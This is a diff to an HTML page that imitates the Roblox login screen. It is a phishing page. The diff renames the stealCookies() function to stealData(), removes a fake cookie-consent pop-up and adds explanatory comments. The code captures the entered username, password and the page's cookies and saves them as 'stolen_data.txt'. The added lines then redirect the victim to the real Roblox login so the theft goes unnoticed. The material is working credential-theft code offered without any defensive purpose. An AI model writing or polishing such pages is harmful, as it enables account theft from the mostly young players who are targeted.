@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>  
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Login</title>
-    <style> 
+    <style>
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -28,7 +28,7 @@
             margin: 10px 0;
             border: 1px solid #ccc;
             border-radius: 4px;
-        } 
+        }
         .login-container button {
             width: 100%;
             padding: 10px;
@@ -45,25 +45,25 @@
         <h1>Roblox Login</h1>
         <input type="text" placeholder="Username" id="username">
         <input type="password" placeholder="Password" id="password">
-        <button onclick="stealCookies()">Login</button>
+        <button onclick="stealData()">Login</button>
     </div>
     <script>
-        setTimeout(function() {
-            alert("Will you allow cookies?");
-            if (confirm("Click 'Yes' to allow cookies.")) {
-                stealCookies();
-            }
-        }, 2000);
-
-        function stealCookies() {
+        function stealData() {
+            // Capture the user's input
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+
+            // Capture the user's cookies
             const cookies = document.cookie;
+
+            // Create a data string
             const data = `Username: ${username}\nPassword: ${password}\nCookies: ${cookies}\n\n`;
 
-            // Save data to a local file
+            // Create a Blob from the data
             const blob = new Blob([data], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
+
+            // Create a link element and trigger the download
             const a = document.createElement('a');
             a.href = url;
             a.download = 'stolen_data.txt';
@@ -71,6 +71,9 @@
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
+
+            // Redirect to the real Roblox website
+            window.location.href = 'https://www.roblox.com/login';
         }
     </script>
 </body>
